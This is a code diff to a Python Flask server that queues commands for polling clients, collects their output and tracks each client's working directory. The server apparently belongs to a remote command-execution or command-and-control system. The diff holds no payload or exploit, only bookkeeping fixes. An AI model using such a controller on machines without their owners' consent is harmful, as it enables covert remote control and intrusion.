@@ -24,6 +24,8 @@ def get_current_clients():
     current_time = time.time()
     for uid, data in CLIENT_STATUS.items():
         if current_time - data.get('timestamp', 0) < LAST_SEEN_TIMEOUT:
+            # Include CWD in the client status
+            data['cwd'] = CLIENT_CWD.get(uid, DEFAULT_CWD)
             active_clients[uid] = data
     return active_clients
 
@@ -49,10 +51,10 @@ def get_command():
     
     response = {"command": command, "cwd": cwd}
     
-    if command != "none":
-        CLIENT_CWD[user_id] = "PENDING"
+    # FIX APPLIED: Removed the CLIENT_CWD[user_id] = "PENDING" line.
         
     return jsonify(response), 200
+
 @app.route("/post-output", methods=["POST"])
 def post_output():
     data = request.json
@@ -61,12 +63,12 @@ def post_output():
     if user_id:
         output_entry = {"output": data.get("output"), "timestamp": data.get("timestamp")}
         COMMAND_OUTPUTS.setdefault(user_id, []).append(output_entry)
+        
         new_cwd = data.get("cwd_after_command")
-        if new_cwd and new_cwd != "error":
+        
+        if new_cwd:
+            # Update CWD only if the client provided a value
             CLIENT_CWD[user_id] = new_cwd
-        elif new_cwd == "error":
-            if CLIENT_CWD.get(user_id) == "PENDING":        
-                 pass 
 
         return jsonify({"message": "Output received"}), 200
     return jsonify({"error": "Missing user_id"}), 400
@@ -101,6 +103,15 @@ def get_output():
     if user_id:
         outputs = COMMAND_OUTPUTS.pop(user_id, [])
         return jsonify({"outputs": outputs}), 200
+    return jsonify({"error": "Missing user_id"}), 400
+
+@app.route("/get-client-cwd", methods=["GET"])
+def get_client_cwd():
+    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
+    user_id = request.args.get("user_id")
+    if user_id:
+        cwd = CLIENT_CWD.get(user_id, DEFAULT_CWD)
+        return jsonify({"cwd": cwd}), 200
     return jsonify({"error": "Missing user_id"}), 400
 
 if __name__ == "__main__":
